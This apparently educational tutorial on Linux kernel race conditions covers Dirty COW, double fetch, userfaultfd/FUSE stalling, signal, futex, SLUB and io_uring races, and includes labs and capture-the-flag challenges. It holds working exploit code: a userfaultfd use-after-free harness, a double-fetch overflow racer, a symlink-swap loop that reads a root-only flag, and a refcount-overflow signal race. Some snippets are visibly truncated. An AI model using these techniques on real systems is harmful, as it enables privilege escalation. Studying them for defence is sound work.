Kernel Race Conditions

Race Condition Fundamentals

A race condition occurs when the correctness of a program depends on the relative timing of concurrent operations. In the kernel, races are especially dangerous because they can violate security assumptions enforced by the kernel itself.

TOCTOUTime-of-Check to Time-of-Use — state changes between validation and useCheck file permissions, then open (file changes between check and open)
Data RaceConcurrent unsynchronized access to shared memory (at least one write)Two threads incrementing a counter without locks
Atomicity ViolationA sequence of operations that should be atomic is interruptedRead-modify-write on a shared variable without locking

// Check: verify user pointer is valid (access_ok)
// Use:   copy_from_user — but user changed the mapping between check and use!

// Another example: double fetch
if (get_user(len, &user_req->length))   // first fetch: check

copy_from_user(buf, user_req->data, 
    user_req->length);                    // second fetch: use (len may differ!)
// Another thread changed user_req->length between the two reads

Dirty COW (CVE-2016-5195)

The most famous kernel race condition. A race between madvise(MADV_DONTNEED) and write() to /proc/self/mem allowed overwriting read-only file mappings (Copy-On-Write pages). Existed for ~9 years in the kernel.

// The race:
// Thread 1: write() to /proc/self/mem at the mmap'd offset
//   → triggers COW fault → kernel allocates private copy
//   → BUT there's a window where the page table entry points
//     to the original (shared, read-only) page WITH write permissions
//
// Thread 2: madvise(MADV_DONTNEED) on the same mapping
//   → discards the private COW copy → reverts to original page
//   → next write goes to the ORIGINAL page (bypassing COW)

// The bug was in get_user_pages() (GUP) — the retry logic
// after a COW fault could lose the "this is a COW page" information
// when the page was discarded by madvise between retries

// Result: write to any file you can read (e.g., /etc/passwd, SUID binaries)
# Affected: Linux 2.6.22 (2007) through 4.8.3 / 4.7.9 / 4.4.26
# Fixed by: adding FOLL_COW flag to GUP to track COW state properly

# Detection
uname -r   # check kernel version
# PoC typically overwrites /etc/passwd or a SUID binary

Pattern: mmap(target_file, READ) → Thread A: write(/proc/self/mem) → Thread B: madvise(MADV_DONTNEED) → repeat until race hits.

Userfaultfd for Race Exploitation

userfaultfd provides a deterministic way to win kernel races. Instead of spinning in a loop hoping to hit the right timing, you stall the kernel at an exact point by faulting on a userfaultfd-registered page.

// How it works:
// 1. Register a memory region with userfaultfd
// 2. When kernel does copy_from_user() on that region → page fault
// 3. Kernel blocks the faulting thread, notifies userspace handler
// 4. Handler runs exploit logic (free, reallocate, spray) while kernel waits
// 5. Handler resolves the fault → kernel resumes with altered state

// Key: the kernel stops *mid-operation* at a precise point
// This turns probabilistic races into deterministic ones

// Setup:
int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API };
ioctl(uffd, UFFDIO_API, &api);

// Map a page but don't populate it
void *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = {
    .range = { .start = (unsigned long)page, .len = 0x1000 },
    .mode = UFFDIO_REGISTER_MODE_MISSING,
};
ioctl(uffd, UFFDIO_REGISTER, &reg);

// When kernel accesses `page`, it faults → your handler gets control
# Check if userfaultfd is available to unprivileged users
cat /proc/sys/vm/unprivileged_userfaultfd
# 0 = restricted (most modern kernels)
# 1 = available to all users

FUSE for Race Exploitation

FUSE (Filesystem in Userspace) provides similar stalling capability as userfaultfd. When the kernel reads from a FUSE-mounted file (e.g., during copy_from_user on an mmap'd FUSE file), the read is handled by a userspace daemon — which can delay arbitrarily.

// FUSE handler stalls on read:
static int fuse_read(const char *path, char *buf, size_t size,
                     off_t offset, struct fuse_file_info *fi) {
    // Kernel is now blocked waiting for us!
    printf("[*] Kernel stalled on FUSE read, doing exploit work...\n");
    
    do_exploit_work();  // free/realloc/spray while kernel waits
    
    memcpy(buf, payload_data, size);  // provide data to resume
    return size;
}

// Advantage over userfaultfd:
// - Works even when unprivileged_userfaultfd = 0
// - Available on most systems (just needs FUSE support)
// Disadvantage:
// - More setup overhead (mount filesystem, write FUSE daemon)
// - Slightly less precise than userfaultfd
# Mount FUSE filesystem
mkdir /tmp/fuse_mount
./exploit_fuse /tmp/fuse_mount &

# The exploit triggers a kernel path that reads from FUSE file:
# e.g., ioctl(fd, CMD, mmap_of_fuse_file)
# kernel does copy_from_user → hits FUSE file → calls our handler

Double Fetch Vulnerabilities

The kernel reads user memory twice — once for validation, once for use. An attacker modifies the memory between fetches.

// Vulnerable pattern:
static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    struct user_request __user *ureq = (void __user *)arg;
    size_t len;

    get_user(len, &ureq->length);     // FETCH 1: read length for validation
    if (len > MAX_BUF) return -EINVAL;

    // *** RACE WINDOW: user thread changes ureq->length ***

    copy_from_user(kbuf, ureq->data, 
        ureq->length);                 // FETCH 2: reads length AGAIN from user memory
                                        // → may now be > MAX_BUF → overflow!
    return 0;
}

// Fix: copy once, use the kernel copy
get_user(len, &ureq->length);
if (len > MAX_BUF) return -EINVAL;
copy_from_user(kbuf, ureq->data, len);  // use kernel-side `len`, not ureq->length

Exploiting Double Fetch

// Attacker: two threads racing on shared userspace struct
struct user_request *shared_req = mmap(...);

// Thread 1: keeps flipping the length
void *flipper(void *arg) {
    while (racing) {
        shared_req->length = SAFE_SIZE;      // passes validation
        usleep(0);
        shared_req->length = OVERFLOW_SIZE;  // causes overflow
    }
}

// Thread 2: keeps calling the vulnerable ioctl
void *caller(void *arg) {
    while (racing) {
        ioctl(fd, VULN_CMD, shared_req);
    }
}

// Eventually the timing aligns: FETCH 1 reads SAFE_SIZE (passes check),
// FETCH 2 reads OVERFLOW_SIZE (used for copy)

Signal-Based Racing

Use signals (e.g., SIGALRM, SIGUSR1) to interrupt kernel operations at precise moments. When a signal is pending during a syscall, the kernel may restart or abort the operation, creating race windows.

// Using alarm() to interrupt blocking operations
#include <signal.h>

volatile int alarm_fired = 0;
void handler(int sig) { alarm_fired = 1; }

signal(SIGALRM, handler);
alarm(0);  // cancel any pending

// Set up race: alarm fires during a blocking kernel operation
struct itimerval timer = {
    .it_value = { .tv_sec = 0, .tv_usec = 1 },  // fire in 1 µs
    .it_interval = { .tv_sec = 0, .tv_usec = 1 },
};
setitimer(ITIMER_REAL, &timer, NULL);

// Now call the vulnerable syscall — signal interrupts it mid-operation
int ret = syscall_that_races(...);
// If interrupted at the right moment, kernel state is inconsistent

Futex Vulnerabilities

The futex() syscall is complex and has been a recurring source of race conditions. It operates on user-space addresses with kernel-side wait queues — the interaction between user-controlled memory and kernel synchronization creates subtle races.

// futex(2) key operations:
// FUTEX_WAIT — sleep until *uaddr != val (kernel checks, then sleeps)
// FUTEX_WAKE — wake N waiters on uaddr
// FUTEX_REQUEUE — move waiters from one futex to another

// Historical vulnerabilities:
// CVE-2014-3153 (Towelroot): FUTEX_REQUEUE race
//   - Requeue from PI futex to non-PI futex
//   - Race between requeue and wake created dangling pointers
//   - Used to root many Android devices

// CVE-2014-0205: futex refcount race
// CVE-2021-3347: PI futex UAF

// The complexity of futex priority inheritance (PI) makes it a
// rich source of races — PI state tracking spans user and kernel

/proc/self/mem Races

Writing to /proc/self/mem bypasses normal memory protection (it calls get_user_pages with force flag). Combined with madvise or other page table manipulation, this creates powerful race primitives.

// /proc/self/mem allows write access to your own virtual memory
// at arbitrary offsets — even to read-only mmap'd files (temporarily,
// due to COW). This is the write primitive used in Dirty COW.

int mem_fd = open("/proc/self/mem", O_RDWR);

// Write to a specific virtual address
lseek(mem_fd, (off_t)target_addr, SEEK_SET);
write(mem_fd, payload, payload_len);

// The kernel uses get_user_pages(FOLL_FORCE | FOLL_WRITE) internally,
// which can trigger COW and temporarily grant write access to the
// underlying page — the race window for Dirty COW

Symlink / Hardlink Races

Filesystem race conditions exploit the gap between checking a path and using it. Classic TOCTOU: check that a path is safe, then the attacker replaces it with a symlink to a sensitive file.

# Classic symlink race:
# Privileged program does:
#   1. stat("/tmp/logfile") → checks it's a regular file
#   2. open("/tmp/logfile", O_WRONLY) → opens it

# Attacker between step 1 and 2:
rm /tmp/logfile
ln -s /etc/shadow /tmp/logfile
# Now the privileged program writes to /etc/shadow!

# In kernel context: modules that resolve paths in /tmp or
# user-writable directories without O_NOFOLLOW
// Kernel-side mitigation: protected_symlinks
// /proc/sys/fs/protected_symlinks = 1
// Prevents following symlinks in sticky directories (like /tmp)
// unless the owner matches

// Hardlink race: create hardlink to sensitive file
// /proc/sys/fs/protected_hardlinks = 1
// Prevents creating hardlinks to files you don't own

Race Conditions in SLUB Allocator

SLUB races occur when an object is freed and reallocated between a pointer dereference. The per-CPU freelists in SLUB can create timing-dependent UAF conditions.

// Race-induced UAF in SLUB:
// Thread 1 (kernel):
//   ptr = cache->freelist;  // get pointer to free object
//   ... scheduling happens ...
//
// Thread 2 (attacker):
//   Triggers free of an adjacent object
//   Reallocates the slot with controlled data
//
// Thread 1 resumes:
//   Uses ptr → now points to attacker-controlled data

// SLUB's cmpxchg_double for freelist operations is atomic,
// but complex paths (especially with debugging off) can have windows

// Also: SLUB freelist pointer is stored inside the free object itself
// If freelist hardening is off (CONFIG_SLAB_FREELIST_HARDENED=n),
// overwriting a free object's first 8 bytes corrupts the freelist

CPU Pinning for Race Stability

// Pin threads to specific CPUs to control scheduling
#define _GNU_SOURCE
#include <sched.h>

void pin_to_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

// Pin racing threads to the SAME CPU → force preemption-based racing
// Or to DIFFERENT CPUs → true parallelism for SMP races

io_uring Race Conditions

io_uring is Linux's async I/O interface. Its complexity (shared ring buffers, kernel worker threads, file registration) has led to numerous race conditions.

// io_uring creates kernel worker threads that process I/O submissions
// asynchronously. Races arise because:
// 1. Multiple kernel workers can process requests concurrently
// 2. File descriptors can be closed while io_uring still references them
// 3. Registered buffers/files can be modified during in-flight operations

// Common io_uring race patterns:
// - IORING_OP_CLOSE races with other operations on the same fd
// - IORING_REGISTER_FILES_UPDATE racing with submission
// - UAF in io_uring worker thread cleanup

// io_uring is disabled in many hardened environments:

Lab 3: Userfaultfd Race Setup

Medium

Objective: Set up a userfaultfd handler that stalls a kernel copy_from_user call. While stalled, perform a heap operation (free/reallocate) to demonstrate deterministic race control.

// Complete userfaultfd race harness
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>

static int vuln_fd;
static int uffd;

void *fault_handler(void *arg) {
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };
    poll(&pfd, 1, -1);

    struct uffd_msg msg;
    read(uffd, &msg, sizeof(msg));
    printf("[*] Page fault at 0x%llx — kernel is stalled!\n",
           msg.arg.pagefault.address);

    // === EXPLOIT WINDOW: kernel is frozen mid-copy_from_user ===
    printf("[*] Freeing object while kernel is stalled...\n");
    ioctl(vuln_fd, IOCTL_FREE, 0);    // free the object
    printf("[*] Spraying replacement...\n");
    // spray_replacement();             // reclaim with controlled data
    // === END WINDOW ===

    // Provide page data to unblock kernel
    char page_data[0x1000] = {0};
    struct uffdio_copy uc = {
        .dst = msg.arg.pagefault.address & ~0xFFFUL,
        .src = (unsigned long)page_data,
        .len = 0x1000,
    };
    ioctl(uffd, UFFDIO_COPY, &uc);
    return NULL;
}

int main() {
    vuln_fd = open("/dev/vuln", O_RDWR);

    // Setup userfaultfd
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    struct uffdio_api api = { .api = UFFD_API };
    ioctl(uffd, UFFDIO_API, &api);

    void *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct uffdio_register reg = {
        .range = { .start = (unsigned long)page, .len = 0x1000 },
        .mode = UFFDIO_REGISTER_MODE_MISSING,
    };
    ioctl(uffd, UFFDIO_REGISTER, &reg);

    // Start handler, trigger vuln ioctl with uffd page
    pthread_t t;
    pthread_create(&t, NULL, fault_handler, NULL);

    ioctl(vuln_fd, IOCTL_ALLOC, 0);           // allocate target object
    ioctl(vuln_fd, IOCTL_COPY_FROM, page);     // copy_from_user → faults!
    // After unblock: kernel uses the object we freed → UAF
    ioctl(vuln_fd, IOCTL_USE, 0);

    pthread_join(t, NULL);
    return 0;
}

Lab 5: Double Fetch Detection

Medium

Objective: Identify and exploit a double-fetch vulnerability in a kernel module. Write a multi-threaded program where one thread flips a value in shared memory while the other calls the vulnerable ioctl.

// vuln_double_fetch.c — kernel module
struct request {
    size_t length;
    char data[256];
};

static long df_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    struct request __user *ureq = (void __user *)arg;
    size_t len;
    char kbuf[128];

    get_user(len, &ureq->length);          // fetch 1
    if (len > sizeof(kbuf)) return -EINVAL;

    // BUG: reads length again from userspace!
    copy_from_user(kbuf, ureq->data, ureq->length);  // fetch 2

}
// exploit_df.c — race the double fetch
#include <pthread.h>
volatile int racing = 1;
struct request *shared;

void *flipper(void *arg) {
    while (racing) {
        shared->length = 64;     // safe (passes check)
        shared->length = 512;    // overflow (bypasses check)
    }
    return NULL;
}

int main() {
    shared = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                  MAP_SHARED|MAP_ANONYMOUS, -1, 0);

    int fd = open("/dev/double_fetch", O_RDWR);
    pthread_t t;
    pthread_create(&t, NULL, flipper, NULL);

    for (int i = 0; i < 100000; i++)
        ioctl(fd, 0x1337, shared);  // race: fetch1=64, fetch2=512 → overflow!

    racing = 0;
    pthread_join(t, NULL);
}

// Measure race window in CPU cycles
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/ioctl.h>

static inline uint64_t rdtsc(void) {
    uint32_t lo, hi;
    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

static int fd;
static volatile uint64_t window_start = 0, window_end = 0;

// Thread that detects when the race window opens/closes
void *prober(void *arg) {

            window_start = rdtsc();
        else if (state == STATE_SAFE && window_start != 0) {
            window_end = rdtsc();
            break;
        }
    }
    return NULL;
}

int main() {
    fd = open("/dev/race_test", O_RDWR);

    pthread_create(&t, NULL, prober, NULL);

    // Trigger the vulnerable operation
    ioctl(fd, IOCTL_VULN_OP, 0);

    pthread_join(t, NULL);

    uint64_t cycles = window_end - window_start;
    double ns = cycles / 3.0;  // ~3 GHz CPU → 1 cycle ≈ 0.33ns
    printf("Race window: %lu cycles (%.1f ns)\n", cycles, ns);
    printf("At 3GHz: ~%.1f microseconds\n", ns / 1000.0);

    // If racer iteration takes ~100 cycles and window is ~1000 cycles:
    // P(win) ≈ window_cycles / racer_cycles ≈ 10%

Challenge 1: TOCTOU File Race

Easy

A SUID binary reads a user-specified file after checking permissions with access(). The flag is in /flag (root-only). Exploit the TOCTOU gap to read it.

# The binary does:
#   access(argv[1], R_OK) → if ok → cat(argv[1])
# Race: point to your file for access(), swap to /flag before cat()

# Solution:
echo "dummy" > /tmp/myfile

    ln -sf /flag /tmp/myfile
    ln -sf /dev/null /tmp/myfile

for i in $(seq 1 10000); do
    result=$(./suid_reader /tmp/myfile 2>/dev/null)
    if echo "$result" | grep -q "FLAG{"; then
        echo "$result"
        break
    fi
done

The access() syscall checks permissions using the real UID, while open() uses the effective UID (root for SUID). Between the two calls, swap the symlink target. You need a tight loop because the window is small.

Challenge 2: Userfaultfd-Assisted UAF

Medium

A kernel module has a function that allocates an object, copies user data into it, then uses the object. Use userfaultfd to stall the copy and free the object before it's used.

// Module's vulnerable function (pseudocode):
// 1. obj = kmalloc(64)
// 2. copy_from_user(obj->data, user_buf, 48)  ← stall here!
// 3. obj->callback()  ← use after we freed and reclaimed

// Exploit:
// - Register user_buf with userfaultfd
// - Call the ioctl → stalls at step 2
// - In fault handler: free obj, reclaim with controlled data
// - Provide page to resume → step 3 calls our function pointer

// Key: the copy_from_user in step 2 will fault on our uffd page
// giving us time to manipulate the heap between step 1 and step 3

The trick is that copy_from_user at step 2 writes to obj->data, but your userfaultfd page fault occurs when the kernel reads from user_buf. While stalled, you can't free the specific obj being written to (the kernel holds a reference). Instead, use a different ioctl to free a different object, then spray to set up the heap. The vulnerability is in step 3 using a different, previously-freed object pointer.

Challenge 3: Double Fetch Exploit

Medium

A kernel module reads a user-supplied length field twice — once for validation, once for copy_from_user. Exploit the double fetch to overflow a 128-byte kernel stack buffer.

// Thread 1: repeatedly calls ioctl(fd, CMD, shared_struct)
// Thread 2: flips shared_struct->length between 64 (safe) and 512 (overflow)

// Timing: typically need 1000-100000 attempts

Challenge 4: Signal Handler Race

Medium

A kernel module's ioctl handler performs a blocking operation. During the block, a pending signal causes the operation to restart via -ERESTARTSYS, but the module doesn't properly clean up state before restarting. Exploit this to corrupt a reference count.

// Module pseudocode:
// ioctl handler:
//   refcount++
//   wait_for_event()  ← can be interrupted by signal
//   if (signal_pending) return -ERESTARTSYS;  // refcount not decremented!
//   refcount--
//   ...

// Exploit: send signals during the wait to increment refcount
// multiple times without corresponding decrements → refcount overflow
// → can trick the module into freeing an in-use object (refcount = 0 after wrap)

struct itimerval timer = {
    .it_value = { .tv_sec = 0, .tv_usec = 10 },
    .it_interval = { .tv_sec = 0, .tv_usec = 10 },
};
signal(SIGALRM, sighandler);
setitimer(ITIMER_REAL, &timer, NULL);

// Rapid ioctl calls, each interrupted by signal → refcount keeps growing
for (int i = 0; i < 0x100000000UL; i++)
    ioctl(fd, CMD, 0);  // returns -EINTR due to signal → refcount leak

The goal is a 32-bit refcount overflow: increment it 2^32 times to wrap back to 0. At that point, a normal release path sees refcount=0 and frees the object while others still hold references → UAF. The signal must interrupt the blocking wait before the ioctl completes, so every call leaks one refcount increment.

Challenge 6: SLUB Race Condition

Hard

Challenge 10: Multi-Threaded Kernel Race

Hard

A kernel module manages a shared linked list without proper locking. Multiple threads can add, remove, and traverse nodes concurrently. Exploit the lack of synchronization to corrupt the list, achieve arbitrary read/write, and escalate privileges.

// Module: linked list operations without locks
// ADD: allocates node, links into list
// REMOVE: unlinks node, frees it
// TRAVERSE: walks list, calls node->callback()

// Race: REMOVE while TRAVERSE is walking → use-after-free
// Or: concurrent REMOVE of adjacent nodes → list corruption

// Exploit approach:
// 1. Add many nodes to populate the list
// 2. Thread A: continuously traverse (calls callbacks)
// 3. Thread B: remove a node → frees it
// 4. Thread C: spray with controlled data to reclaim freed node
// 5. When traverse hits the reclaimed node → calls our callback

// List corruption variant:
// Concurrent remove of nodes A→B→C
// Thread 1 removes B (sets A→next = C)
// Thread 2 removes B again (double-free!) before thread 1's write is visible

// CPU pinning on 2+ cores is critical for reliable SMP races
